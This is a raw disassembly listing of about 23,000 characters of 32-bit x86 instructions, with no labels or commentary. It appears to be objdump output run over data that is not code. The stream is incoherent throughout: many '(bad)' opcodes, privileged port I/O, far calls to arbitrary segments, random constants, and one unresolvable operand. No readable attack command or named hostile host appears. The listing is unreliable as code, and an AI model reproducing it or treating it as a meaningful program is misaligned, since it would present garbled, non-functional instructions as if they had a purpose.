  42207a:	fidivr WORD PTR [edi]
  42207c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42207d:	aad    0xdf
  42207f:	mov    cs,WORD PTR [edx+0x0]
  422082:	inc    ecx
  422083:	sub    eax,DWORD PTR [eax+ebp*8+0x31]
  422087:	das    
  422088:	out    dx,al
  422089:	sub    ch,cl
  42208b:	in     eax,0x13
  42208d:	js     0x4220ea
  42208f:	push   es
  422090:	imul   ebp,DWORD PTR [ecx+esi*1],0x66bcbfd6
  422097:	jmp    0x422035
  422099:	into   
  42209a:	xlat   BYTE PTR ds:[ebx]
  42209b:	popf   
  42209c:	cmc    
  42209d:	in     al,0x37
  42209f:	(bad)  
  4220a0:	or     eax,0xd2307c0b
  4220a5:	jo     0x422108
  4220a7:	imul   eax,DWORD PTR [ecx-0xf015557],0xbd191c6d
  4220b1:	sub    al,0x30
  4220b3:	mov    edi,0x737c4903
  4220b8:	in     al,0x1e
  4220ba:	in     eax,0xc3
  4220bc:	and    dh,al
  4220be:	jmp    0x47ac:0xb3fd4b4f
  4220c5:	outs   dx,DWORD PTR ds:[esi]
  4220c6:	xor    BYTE PTR [ebp-0x4c],0x7e
  4220ca:	bnd je 0x4220d4
  4220cd:	fsubrp st(4),st
  4220cf:	mov    ds:0xc180ad61,eax
  4220d4:	pop    ecx
  4220d5:	inc    eax
  4220d6:	outs   dx,DWORD PTR ds:[esi]
  4220d7:	fist   DWORD PTR [esi]
  4220d9:	retf   0x7101
  4220dc:	inc    esi
  4220dd:	les    ebp,FWORD PTR [esi-0x14]
  4220e0:	or     BYTE PTR [esi],cl
  4220e2:	or     eax,0xd3833475
  4220e7:	outs   dx,BYTE PTR ds:[esi]
  4220e8:	push   esi
  4220e9:	fisub  DWORD PTR [ebp+0x66d1097c]
  4220ef:	rcr    ch,1
  4220f1:	test   eax,0x276ed3fd
  4220f6:	adc    ah,BYTE PTR [edx-0x65]
  4220f9:	or     al,0x14
  4220fb:	or     BYTE PTR [esi-0x4cf88df9],al
  422101:	add    dl,0x91
  422104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422105:	xchg   ebp,eax
  422106:	les    ebx,FWORD PTR [ebp+0x72]
  422109:	mov    ds:0x359ea8fe,al
  42210e:	pushf  
  42210f:	add    esi,DWORD PTR [eax+ecx*8]
  422112:	les    ebp,FWORD PTR [esi+eax*1+0x5c]
  422116:	sub    DWORD PTR [esi-0x80],ebx
  422119:	sbb    al,0x3f
  42211b:	sub    edi,edi
  42211d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42211e:	je     0x42212c
  422120:	gs sub ah,ch
  422123:	outs   dx,DWORD PTR ds:[esi]
  422124:	in     eax,dx
  422125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422126:	(bad)  
  422127:	ja     0x422176
  422129:	mov    ebp,0xe56b6aa3
  42212e:	out    0x16,al
  422130:	and    BYTE PTR [edx-0x26],dl
  422133:	clc    
  422134:	mul    DWORD PTR [ebp-0x24]
  422137:	dec    ebx
  422138:	arpl   WORD PTR [edi],si
  42213a:	lock sar ah,1
  42213d:	jb     0x4220ce
  42213f:	iret   
  422140:	or     DWORD PTR [edx-0x68],0x13
  422144:	je     0x422114
  422146:	or     ah,BYTE PTR [ebx-0x1231747d]
  42214c:	adc    ebp,ecx
  42214e:	leave  
  42214f:	mov    edi,0x26b9ae66
  422154:	sub    al,0xb4
  422156:	mov    ch,0xa9
  422158:	add    ch,BYTE PTR [edx]
  42215a:	lahf   
  42215b:	ja     0x42215e
  42215d:	and    eax,DWORD PTR [ecx-0x6366ad8c]
  422163:	push   ss
  422164:	lds    ecx,FWORD PTR [esi]
  422166:	and    ecx,eax
  422168:	enter  0x54c7,0x13
  42216c:	stc    
  42216d:	push   0x560d1dd6
  422172:	call   0x33e2:0x84b0f723
  422179:	das    
  42217a:	xchg   esi,eax
  42217b:	pop    ebx
  42217c:	pop    edi
  42217d:	inc    eax
  42217e:	iret   
  42217f:	cdq    
  422180:	adc    eax,DWORD PTR [esi-0xeaa9ef9]
  422186:	inc    ecx
  422187:	inc    eax
  422188:	dec    esi
  422189:	sbb    ebp,esp
  42218b:	jne    0x42220a
  42218d:	cs not eax
  422190:	pop    esp
  422191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422192:	scas   al,BYTE PTR es:[edi]
  422193:	inc    ebx
  422194:	adc    eax,ebp
  422196:	addr16 mov al,0x7b
  422199:	stos   DWORD PTR es:[edi],eax
  42219a:	adc    al,0xe6
  42219c:	mov    ds:0x62f51970,eax
  4221a1:	int3   
  4221a2:	mov    WORD PTR [esi-0x48],fs
  4221a5:	les    edx,FWORD PTR [ebp-0x71]
  4221a8:	add    eax,DWORD PTR [esi-0x349defa1]
  4221ae:	repz ja 0x422149
  4221b1:	adc    eax,DWORD PTR [edx]
  4221b3:	mov    ecx,0x5f5d5750
  4221b8:	jo     0x4221e6
  4221ba:	sub    eax,0xfb315e8a
  4221bf:	iret   
  4221c0:	das    
  4221c1:	xchg   ecx,eax
  4221c2:	mov    al,0xad
  4221c4:	and    ebx,esi
  4221c6:	in     al,dx
  4221c7:	jo     0x422198
  4221c9:	cmp    al,0x8f
  4221cb:	jl     0x42216e
  4221cd:	jae    0x4221ea
  4221cf:	repz cmp eax,0x39d819b8
  4221d5:	sahf   
  4221d6:	(bad)  
  4221d7:	jne    0x422215
  4221d9:	and    ebx,DWORD PTR [ebx]
  4221db:	mov    ebx,0x2d73f74e
  4221e0:	pushf  
  4221e1:	push   esp
  4221e2:	nop
  4221e3:	inc    edx
  4221e4:	mov    ds:0x473d53dc,al
  4221e9:	mov    eax,0x82e412dd
  4221ee:	test   BYTE PTR [esi+0xb],dl
  4221f1:	push   ecx
  4221f2:	(bad)  
  4221f3:	xchg   esp,eax
  4221f4:	addr16 push esi
  4221f6:	cmp    esi,DWORD PTR [esi+0xeaf034a]
  4221fc:	es rcr al,cl
  4221ff:	xchg   edi,eax
  422200:	int    0x93
  422202:	in     al,dx
  422203:	enter  0xe260,0xc6
  422207:	sbb    esp,DWORD PTR [esi-0x3e]
  42220a:	sub    DWORD PTR [esp+eax*4-0x74],ebp
  42220e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42220f:	ss (bad) 
  422211:	pop    edx
  422212:	adc    al,0xf2
  422214:	ins    DWORD PTR es:[edi],dx
  422215:	jno    0x4221c0
  422217:	push   eax
  422218:	cs popf 
  42221a:	jp     0x422232
  42221c:	adc    DWORD PTR [edx+ecx*2+0x1a0a44c9],ecx
  422223:	sub    ch,BYTE PTR [ebx]
  422225:	and    dl,bl
  422227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422228:	adc    edx,ebp
  42222a:	ds mov al,0x8c
  42222d:	repnz retf 0x98de
  422231:	pop    ebx
  422232:	pop    ds
  422233:	cli    
  422234:	in     eax,0x5
  422236:	mov    edx,0xc7c5a4a
  42223b:	imul   ecx,DWORD PTR [ebp-0x218d0742],0xa614157c
  422245:	push   0xff852b60
  42224a:	mov    ds:0x5363302b,al
  42224f:	sti    
  422250:	jge    0x422265
  422252:	xchg   esi,eax
  422253:	inc    bp
  422255:	iret   
  422256:	dec    edx
  422257:	int3   
  422258:	xchg   ebp,eax
  422259:	jae    0x422278
  42225b:	mov    eax,0xd43d93e0
  422260:	push   0x3c88c5a8
  422265:	in     eax,0x5c
  422267:	jp     0x4222d8
  422269:	xchg   ebp,eax
  42226a:	xor    cl,0xe4
  42226d:	ret    
  42226e:	cmp    eax,0xa8ac18f4
  422273:	mov    dl,0xa2
  422275:	test   edx,eax
  422277:	jbe    0x422209
  422279:	pusha  
  42227a:	mov    al,es:0x3d6e7a28
  422280:	adc    BYTE PTR [edx+0x1dc6660],ah
  422286:	pop    edx
  422287:	xor    eax,0xc8fd30a7
  42228c:	leave  
  42228d:	xchg   ebx,eax
  42228e:	push   esi
  42228f:	mov    bh,0xc0
  422291:	mov    ebx,0x286ee9c8
  422296:	inc    eax
  422297:	ja     0x4222a3
  422299:	jge    0x422299
  42229b:	leave  
  42229c:	pop    ebx
  42229d:	adc    cl,BYTE PTR [edx]
  42229f:	inc    esp
  4222a0:	jl     0x4222eb
  4222a2:	shl    al,0x1c
  4222a5:	mov    ds:0xe58bad0b,al
  4222aa:	rol    DWORD PTR [edx],1
  4222ac:	sbb    ecx,DWORD PTR ds:0x4077dcca
  4222b2:	add    BYTE PTR [eax],dh
  4222b4:	xor    bl,BYTE PTR [edi]
  4222b6:	out    dx,al
  4222b7:	loopne 0x42225e
  4222b9:	ffreep st(4)
  4222bb:	fdivr  DWORD PTR [edx+0x11]
  4222be:	pop    esp
  4222bf:	mov    edx,0xf8355f17
  4222c4:	arpl   bp,di
  4222c6:	push   ebx
  4222c7:	(bad)  
  4222c8:	retf   
  4222c9:	jae    0x4222c5
  4222cb:	xchg   esi,eax
  4222cc:	jno    0x4222a0
  4222ce:	push   edi
  4222cf:	cmp    BYTE PTR [eax-0x4d],0x61
  4222d3:	add    al,0x30
  4222d5:	inc    ebp
  4222d6:	sahf   
  4222d7:	sahf   
  4222d8:	in     eax,0x8
  4222da:	ja     0x4222ba
  4222dc:	jo     0x422281
  4222de:	or     bh,dh
  4222e0:	das    
  4222e1:	hlt    
  4222e2:	sbb    BYTE PTR [ebx],0x45
  4222e5:	in     al,dx
  4222e6:	jecxz  0x4222af
  4222e8:	fiadd  WORD PTR [esi]
  4222ea:	lds    esi,FWORD PTR [eax+0x3]
  4222ed:	mov    gs,WORD PTR ds:0x968011f1
  4222f3:	xchg   BYTE PTR [eax-0x6e],ch
  4222f6:	and    edi,DWORD PTR [esi]
  4222f8:	ins    BYTE PTR es:[edi],dx
  4222f9:	xchg   edx,eax
  4222fa:	sahf   
  4222fb:	jmp    0x734fba4c
  422300:	out    0x31,eax
  422302:	mov    al,ds:0x77edf076
  422307:	es mov ch,0xc1
  42230a:	hlt    
  42230b:	and    BYTE PTR [eax],0x97
  42230e:	lahf   
  42230f:	leave  
  422310:	push   ebp
  422311:	push   edi
  422312:	mov    bl,0x41
  422314:	mov    ebx,DWORD PTR fs:[eax-0x7373d4d]
  42231b:	jne    0x422393
  42231d:	outs   dx,BYTE PTR ds:[esi]
  42231e:	adc    edx,esi
  422320:	scas   eax,DWORD PTR es:[edi]
  422321:	into   
  422322:	mov    ah,0x83
  422324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422325:	jb     0x42238e
  422327:	xchg   esi,eax
  422328:	pop    ss
  422329:	cmp    eax,0x87ec383
  42232e:	popa   
  42232f:	jne    0x42239f
  422331:	inc    edx
  422332:	aas    
  422333:	mov    ds:0xf8d8fec3,al
  422338:	pop    ss
  422339:	xor    DWORD PTR es:[ebx],ecx
  42233c:	outs   dx,BYTE PTR ds:[esi]
  42233d:	leave  
  42233e:	push   0x62
  422340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422341:	lock cwde 
  422343:	fidivr WORD PTR [ebp+0x75]
  422346:	loop   0x422333
  422348:	les    ebx,FWORD PTR [edx+0x1f9fe4d0]
  42234e:	sar    BYTE PTR [edx-0x1e3c30f8],cl
  422354:	jb     0x422352
  422356:	cmp    DWORD PTR [ebp+0x11],0x58
  42235a:	out    dx,al
  42235b:	lock cdq 
  42235d:	nop
  42235e:	jg     0x4222ee
  422360:	dec    eax
  422361:	mov    al,0xa6
  422363:	jge    0x422341
  422365:	jg     0x4223b1
  422367:	xchg   ebp,eax
  422368:	les    ebp,FWORD PTR [eax-0x26]
  42236b:	mov    eax,0xb8af45ec
  422370:	dec    edi
  422371:	xor    eax,0x8043a737
  422376:	retf   
  422377:	pop    ecx
  422378:	dec    ebx
  422379:	div    BYTE PTR [edi]
  42237b:	call   0x3be4:0x61881f8
  422382:	push   ebp
  422383:	mov    ch,0x16
  422385:	adc    dl,BYTE PTR ds:0xb1d56bf3
  42238b:	cwde   
  42238c:	fistp  QWORD PTR ds:0x3a0f823d
  422392:	mov    al,0xf5
  422394:	sub    al,0x37
  422396:	cmp    edi,DWORD PTR es:0x1a93032d
  42239d:	push   0x119048a6
  4223a2:	push   esp
  4223a3:	and    al,0x6f
  4223a5:	cs popa 
  4223a7:	jnp    0x422390
  4223a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223aa:	pop    ebp
  4223ab:	cwde   
  4223ac:	daa    
  4223ad:	cs sahf 
  4223af:	xor    bl,bl
  4223b1:	xchg   esi,eax
  4223b2:	retf   
  4223b3:	test   cl,cl
  4223b5:	out    dx,eax
  4223b6:	fdiv   st,st(0)
  4223b8:	jge    0x4223ee
  4223ba:	ja     0x422432
  4223bc:	push   esi
  4223bd:	cs js  0x422381
  4223c0:	cli    
  4223c1:	inc    esp
  4223c2:	idiv   DWORD PTR [ebx*8+0x42122766]
  4223c9:	pop    ecx
  4223ca:	cwde   
  4223cb:	retf   0xbc6e
  4223ce:	lds    edx,FWORD PTR [edi-0x32]
  4223d1:	fimul  DWORD PTR [ecx-0x22]
  4223d4:	dec    esi
  4223d5:	mov    ecx,0x9750
  4223da:	add    BYTE PTR [eax],al
  4223dc:	add    BYTE PTR [eax],al
  4223de:	add    BYTE PTR [eax],al
  4223e0:	add    BYTE PTR [esi+0x7c],ah
  4223e3:	loopne 0x4223a0
  4223e5:	cli    
  4223e6:	mov    edi,0xa15cfd7f
  4223eb:	pop    esp
  4223ec:	dec    edi
  4223ed:	mov    esi,0x52146048
  4223f2:	popf   
  4223f3:	add    DWORD PTR [eax],eax
  4223f5:	scas   eax,DWORD PTR es:[edi]
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    BYTE PTR [edi-0x59],bh
  4223fb:	pop    esp
  4223fc:	in     eax,dx
  4223fd:	test   al,0x3f
  4223ff:	and    ecx,DWORD PTR [edx]
  422401:	dec    esi
  422402:	stos   BYTE PTR es:[edi],al
  422403:	mov    cl,0x69
  422405:	std    
  422406:	repz jecxz 0x42245f
  422409:	imul   esp,ebp,0x68
  42240c:	jecxz  0x4223dd
  42240e:	imul   edx,DWORD PTR [ebx+0x62],0x20
  422412:	xchg   edx,eax
  422413:	cmp    al,0x54
  422415:	xor    BYTE PTR [esi-0x49],dh
  422418:	push   ecx
  422419:	xor    ah,BYTE PTR [ebp-0x52]
  42241c:	or     eax,0x17cf2f9d
  422421:	sti    
  422422:	inc    eax
  422423:	adc    bh,BYTE PTR [edi-0x46]
  422426:	cmc    
  422427:	cmp    eax,0xba57a849
  42242c:	jae    0x4223f6
  42242e:	shr    DWORD PTR [edi-0x28],0x56
  422432:	imul   eax,esi,0xf
  422435:	jno    0x4223f0
  422437:	jmp    0x27fa3b8e
  42243c:	in     al,dx
  42243d:	leave  
  42243e:	dec    ebp
  42243f:	xor    al,0xb4
  422441:	ret    0x7eb1
  422444:	aam    0xd9
  422446:	clc    
  422447:	xor    BYTE PTR [edi-0x2f],dh
  42244a:	pop    esp
  42244b:	push   esi
  42244c:	data16 in al,0x46
  42244f:	das    
  422450:	sbb    BYTE PTR [eax+0x27a258a6],0xb0
  422457:	sahf   
  422458:	mov    esp,0xea3da75c
  42245d:	push   0xffffffa3
  42245f:	(bad)  
  422460:	int3   
  422461:	mov    bh,0xf5
  422463:	adc    DWORD PTR [eax+0x34],edx
  422466:	lds    ecx,FWORD PTR [ecx]
  422468:	lock scas al,BYTE PTR es:[edi]
  42246a:	mov    dh,0x3a
  42246c:	loop   0x4224db
  42246e:	xor    BYTE PTR [eax],0xc6
  422471:	mov    edi,0x329f5b96
  422476:	mov    WORD PTR [edi+0x439cf9cc],cs
  42247c:	call   0x2399:0xca0a90ff
  422483:	mov    ds:0x44634dce,al
  422488:	repz mov al,ds:0xf07057f9
  42248e:	clc    
  42248f:	inc    ebx
  422490:	cmp    eax,0x6058014e
  422495:	call   FWORD PTR [ecx+0x68]
  422498:	push   es
  422499:	mov    bh,0x51
  42249b:	cmp    al,0x56
  42249d:	loope  0x4224dd
  42249f:	push   edx
  4224a0:	rcr    DWORD PTR [eax-0x39],0x7f
  4224a4:	icebp  
  4224a5:	scas   eax,DWORD PTR es:[edi]
  4224a6:	inc    ebp
  4224a7:	fstp   QWORD PTR [esi]
  4224a9:	rcl    BYTE PTR [edi],0x13
  4224ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ad:	stc    
  4224ae:	fimul  DWORD PTR [esi+0x77]
  4224b1:	jb     0x4224af
  4224b3:	cmc    
  4224b4:	jbe    0x422467
  4224b6:	lods   eax,DWORD PTR ds:[esi]
  4224b7:	inc    ebp
  4224b8:	and    esp,DWORD PTR [ebp+0x7]
  4224bb:	or     esi,DWORD PTR [esi+0x42]
  4224be:	inc    ebx
  4224bf:	adc    al,0x12
  4224c1:	push   es
  4224c2:	and    ah,cl
  4224c4:	std    
  4224c5:	jecxz  0x4224ef
  4224c7:	into   
  4224c8:	pop    esp
  4224c9:	ins    DWORD PTR es:[edi],dx
  4224ca:	xchg   ebx,eax
  4224cb:	outs   dx,DWORD PTR ds:[esi]
  4224cc:	or     bl,BYTE PTR [esi]
  4224ce:	inc    eax
  4224cf:	inc    edi
  4224d0:	imul   esi,DWORD PTR [eax+0x79a9eda7],0x22
  4224d7:	add    eax,0xa7c50718
  4224dc:	sbb    bl,0x2d
  4224df:	pop    ss
  4224e0:	jecxz  0x42253b
  4224e2:	mov    al,0x4c
  4224e4:	call   0xd01a:0x7413e2db
  4224eb:	pop    ds
  4224ec:	mov    ebp,DWORD PTR [edi]
  4224ee:	xor    BYTE PTR [edx],dh
  4224f0:	or     BYTE PTR [edx-0x35],0x8f
  4224f4:	adc    al,0x71
  4224f6:	jecxz  0x4224e3
  4224f8:	mov    al,ds:0x1179bba9
  4224fd:	dec    esp
  4224fe:	jmp    0xce30c672
  422503:	repz push cs
  422505:	mov    ebp,0xe7baa45b
  42250a:	sbb    DWORD PTR [ecx-0x19e7b42],0xffffffb1
  422511:	rcr    DWORD PTR [ebx+0x5706f1d6],1
  422517:	xchg   edx,eax
  422518:	int3   
  422519:	imul   ch
  42251b:	cmc    
  42251c:	cmc    
  42251d:	adc    BYTE PTR [ecx],0xce
  422520:	rcr    DWORD PTR [edi+0x3c],cl
  422523:	or     al,0x5c
  422525:	out    0x70,al
  422527:	sub    al,0x70
  422529:	popa   
  42252a:	in     eax,dx
  42252b:	retf   0xcce5
  42252e:	or     ch,dl
  422530:	and    bl,BYTE PTR [ecx]
  422532:	fimul  WORD PTR [edi]
  422534:	cli    
  422535:	ins    BYTE PTR es:[edi],dx
  422536:	or     DWORD PTR [edi+0x75],ecx
  422539:	add    DWORD PTR [edi-0x9],esi
  42253c:	adc    BYTE PTR [ecx+0x4962ee75],bl
  422542:	adc    edi,edi
  422544:	fnsave [ebx-0x2e37f134]
  42254a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42254b:	in     al,dx
  42254c:	out    dx,eax
  42254d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254e:	sub    eax,DWORD PTR [eax+eiz*4]
  422551:	add    BYTE PTR [ecx-0x6d],bl
  422554:	mov    ebp,0xa1050377
  422559:	(bad)  
  42255b:	ds ss out 0x31,eax
  42255f:	cwde   
  422560:	add    esi,ebx
  422562:	aam    0x87
  422564:	or     DWORD PTR [eax],edi
  422566:	mov    bl,0x94
  422568:	pop    edx
  422569:	fcom   DWORD PTR [edi+0x31f2fe7f]
  42256f:	mov    esi,DWORD PTR [edx+0xb]
  422572:	cdq    
  422573:	jmp    0x4225e4
  422575:	aaa    
  422576:	pop    esp
  422577:	mov    eax,0x736b8a7b
  42257c:	cdq    
  42257d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257f:	jecxz  0x4225a7
  422581:	sti    
  422582:	push   ecx
  422583:	in     al,dx
  422584:	inc    ebp
  422585:	xchg   esp,eax
  422586:	xor    esp,DWORD PTR [ebx+0x6d]
  422589:	fnstsw WORD PTR [eiz*2-0x5668854a]
  422590:	jb     0x422573
  422592:	and    BYTE PTR [ebx-0x14],dh
  422595:	sbb    ecx,edx
  422597:	jecxz  0x422552
  422599:	(bad)  
  42259a:	in     al,0xc0
  42259c:	sahf   
  42259d:	lea    edi,[ebx+edx*2-0x3119cb7f]
  4225a4:	jne    0x42252b
  4225a6:	mov    dh,0x3c
  4225a8:	arpl   WORD PTR [ecx-0x2c0624ea],sp
  4225ae:	call   0xba72:0xec1a8cb3
  4225b5:	mov    al,0x36
  4225b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225b8:	pop    ds
  4225b9:	cwde   
  4225ba:	push   edx
  4225bb:	jne    0x42261f
  4225bd:	mov    ecx,0xeff1efd5
  4225c2:	jg     0x422641
  4225c4:	mov    bl,0x92
  4225c7:	in     eax,dx
  4225c8:	pop    edi
  4225c9:	jo     0x4225fb
  4225cb:	bound  esi,QWORD PTR [ebp+0x41]
  4225ce:	shl    BYTE PTR [edi+0x2f],cl
  4225d1:	in     al,0x8c
  4225d3:	mov    dh,0x99
  4225d5:	pop    eax
  4225d6:	out    0x55,al
  4225d8:	aaa    
  4225d9:	sar    DWORD PTR [esi],0x72
  4225dc:	fisubr DWORD PTR [ebp+0x61dc55af]
  4225e2:	(bad)  
  4225e3:	icebp  
  4225e4:	in     al,dx
  4225e5:	(bad)  
  4225e6:	in     eax,dx
  4225e7:	mov    edx,0xf64a464b
  4225ec:	fiadd  WORD PTR [ecx-0x74]
  4225ef:	xlat   BYTE PTR ds:[ebx]
  4225f0:	jmp    0x4fca:0x81497a90
  4225f7:	or     al,0xce
  4225f9:	xchg   ebp,eax
  4225fa:	iret   
  4225fb:	jbe    0x42265c
  4225fd:	and    dh,ch
  4225ff:	sbb    BYTE PTR [ebx-0x16],bl
  422602:	inc    eax
  422603:	bound  esp,QWORD PTR [ebp-0x4452f855]
  422609:	sbb    eax,DWORD PTR [esi]
  42260b:	xchg   ebp,eax
  42260c:	xor    al,0xd3
  42260e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42260f:	dec    edi
  422610:	inc    esi
  422611:	adc    eax,0x64480d18
  422616:	test   DWORD PTR [edi],0x3e499802
  42261c:	sub    cl,BYTE PTR [ecx+0x8a2f259]
  422622:	mov    bl,0x74
  422624:	fstp   TBYTE PTR [esi]
  422626:	and    ebp,DWORD PTR [ebx+0x12]
  422629:	push   ecx
  42262a:	mov    ?,eax
  42262c:	jp     0x42264c
  42262e:	or     DWORD PTR [edi+ebp*2+0x2d],0x44
  422633:	mov    ch,0x6f
  422635:	in     eax,dx
  422636:	enter  0xcddb,0x50
  42263a:	xor    eax,0xdd39a7b7
  42263f:	mov    ch,0x4c
  422641:	cs push esp
  422643:	out    dx,al
  422644:	pop    ds
  422645:	push   esi
  422646:	xchg   edx,eax
  422647:	sub    DWORD PTR [ebx+0x6b],0xffffffe7
  42264b:	out    0x40,al
  42264d:	std    
  42264e:	xor    bl,al
  422650:	push   0x75
  422652:	call   0xfae7:0x5bccb4a7
  422659:	icebp  
  42265a:	mov    dh,0xbb
  42265c:	(bad)  
  42265d:	jecxz  0x42261c
  42265f:	stos   BYTE PTR es:[edi],al
  422660:	popf   
  422661:	inc    edi
  422662:	pop    ebp
  422663:	retf   0x8219
  422666:	inc    edi
  422667:	cmp    BYTE PTR [esi+0x8],al
  42266a:	aam    0xf
  42266c:	dec    esp
  42266d:	sbb    DWORD PTR [edi+edi*2],0x2e
  422671:	xchg   esp,eax
  422672:	mov    esi,0x625a2adb
  422677:	(bad)  
  422678:	mov    ch,0x8
  42267a:	or     DWORD PTR [edi],edx
  42267c:	popf   
  42267d:	out    0x7e,eax
  42267f:	sbb    eax,0x46636741
  422684:	dec    esp
  422685:	imul   eax,DWORD PTR [ebp-0x3f],0xfffffffa
  422689:	test   al,0xb
  42268b:	arpl   ax,sp
  42268d:	adc    eax,0x81b4bea2
  422692:	xchg   DWORD PTR [edi+0x75ba4fb0],ebp
  422698:	sub    al,0xfa
  42269a:	lea    ecx,[edi-0x32e8aa1f]
  4226a0:	nop
  4226a1:	pop    edx
  4226a2:	imul   eax,DWORD PTR ds:0xc0fa44e3,0xfffffff3
  4226a9:	inc    ebx
  4226aa:	pop    esi
  4226ab:	mov    eax,ds:0x1aec6f7f
  4226b0:	cwde   
  4226b1:	bound  esi,QWORD PTR [esp+ecx*1-0x373dd4bb]
  4226b8:	inc    ecx
  4226b9:	jp     0x4226be
  4226bb:	jle    0x4226c1
  4226bd:	retf   0x2911
  4226c0:	out    dx,eax
  4226c1:	lea    ebx,[ebx+eax*8-0x54]
  4226c5:	adc    cl,ah
  4226c7:	jne    0x422748
  4226c9:	jle    0x42268d
  4226cb:	call   0x6566ef04
  4226d0:	push   ss
  4226d1:	lods   eax,DWORD PTR ds:[esi]
  4226d2:	push   esi
  4226d3:	popa   
  4226d4:	inc    edx
  4226d5:	jp     0x422690
  4226d7:	xor    al,0xd0
  4226d9:	out    0x7,eax
  4226db:	dec    ebp
  4226dc:	mov    dh,0x8d
  4226de:	dec    eax
  4226df:	mov    eax,0x9008dc96
  4226e4:	cs cli 
  4226e6:	ins    DWORD PTR es:[edi],dx
  4226e7:	call   0x99fe:0x3f8842c8
  4226ee:	add    cl,BYTE PTR [ebx]
  4226f0:	stc    
  4226f1:	or     BYTE PTR [ebx],dl
  4226f3:	mov    dl,0xe9
  4226f5:	mov    ds:0xba738974,eax
  4226fb:	jns    0x422775
  4226fd:	int    0x4e
  4226ff:	pushf  
  422700:	add    eax,DWORD PTR [edx]
  422702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422703:	jmp    0x4226d8
  422705:	stc    
  422706:	fs imul eax,ecx,0x236804e1
  42270d:	push   ebx
  42270e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270f:	xor    ah,BYTE PTR [edx+0xc9ffa0f]
  422715:	sbb    esp,ebx
  422717:	lock jle 0x4226d3
  42271a:	stc    
  42271b:	test   ebx,ecx
  42271d:	cmp    bl,al
  42271f:	lock and eax,0xef1d2d8
  422725:	test   BYTE PTR ds:0x741a47e2,dh
  42272b:	(bad)  
  42272c:	shl    BYTE PTR [ebx+eiz*8],1
  42272f:	mov    dl,0x43
  422731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422732:	in     al,0xb8
  422734:	xor    BYTE PTR [esi+0x35cc9f18],bh
  42273a:	(bad)  
  42273b:	jecxz  0x42279a
  42273d:	int    0x21
  42273f:	js     0x42273a
  422741:	ja     0x4226f4
  422743:	ror    bh,cl
  422745:	lds    ebx,FWORD PTR [esi-0x7fbdff41]
  42274b:	imul   edi,DWORD PTR [esi],0x60
  42274e:	adc    al,0xc3
  422750:	outs   dx,DWORD PTR ds:[esi]
  422751:	out    dx,al
  422752:	or     ch,BYTE PTR [edi+0x7c]
  422755:	dec    eax
  422756:	add    al,0x6b
  422758:	adc    esp,ebx
  42275a:	shl    DWORD PTR [ecx-0x33],cl
  42275d:	iret   
  42275e:	out    0x2a,al
  422760:	or     ecx,DWORD PTR [ebx+0x37]
  422763:	dec    eax
  422764:	inc    eax
  422765:	aad    0x36
  422767:	mov    ah,0xac
  422769:	mov    WORD PTR [esi-0x46],cs
  42276c:	sub    BYTE PTR [eax-0x61],al
  42276f:	push   esp
  422770:	iret   
  422771:	push   0x23016c90
  422776:	stos   DWORD PTR es:[edi],eax
  422777:	mov    ds:0x3ef81392,al
  42277c:	fisub  WORD PTR [esi]
  42277e:	add    al,0x42
  422780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422781:	dec    edx
  422782:	mov    dl,0x33
  422784:	mov    al,0x89
  422786:	add    al,0x6f
  422788:	sub    ebp,DWORD PTR [eax-0x26]
  42278b:	sub    al,0xd6
  42278d:	loope  0x422753
  42278f:	mov    ecx,0x6f84ca66
  422794:	out    dx,al
  422795:	mov    eax,0x66f58bc
  42279a:	shr    dh,cl
  42279c:	mov    eax,0x4038d9b0
  4227a1:	and    al,0x79
  4227a3:	in     eax,0xf7
  4227a5:	sub    eax,0xa51
  4227aa:	add    BYTE PTR [eax],al
  4227ac:	add    BYTE PTR [eax],al
  4227ae:	add    BYTE PTR [eax],al
  4227b0:	add    BYTE PTR [edi+0x75],ah
  4227b3:	int3   
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	imul   dl
  4227bf:	test   BYTE PTR [edx],al
  4227c1:	add    DWORD PTR [ecx+0x3af0001],esp
  4227c7:	add    BYTE PTR [eax],al
  4227c9:	or     dl,BYTE PTR [eax+ebx*4]
  4227cc:	daa    
  4227cd:	lock mov esi,0xf0c8a7bc
  4227d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d4:	or     al,0x3e
  4227d6:	fwait
  4227d7:	sub    edi,DWORD PTR [esi]
  4227d9:	jne    0x42281a
  4227db:	lods   al,BYTE PTR ds:[esi]
  4227dc:	in     eax,dx
  4227dd:	iret   
  4227de:	mov    ds:0x17936b19,eax
  4227e3:	sbb    DWORD PTR [ebp-0x379e2865],edi
  4227e9:	push   ecx
  4227ea:	xor    eax,0xce77970c
  4227ef:	push   esp
  4227f0:	mov    edi,DWORD PTR [ecx-0x708ec8a9]
  4227f6:	mov    dh,BYTE PTR ds:0x6a772739
  4227fc:	aad    0xc6
  4227fe:	xchg   esp,eax
  4227ff:	cli    
  422800:	inc    eax
  422801:	xor    eax,0x88f367b4
  422806:	sbb    DWORD PTR [edi],0x5aa40bf7
  42280c:	retf   
  42280d:	ret    
  42280e:	lods   al,BYTE PTR ds:[esi]
  42280f:	paddsb mm2,QWORD PTR [edi]
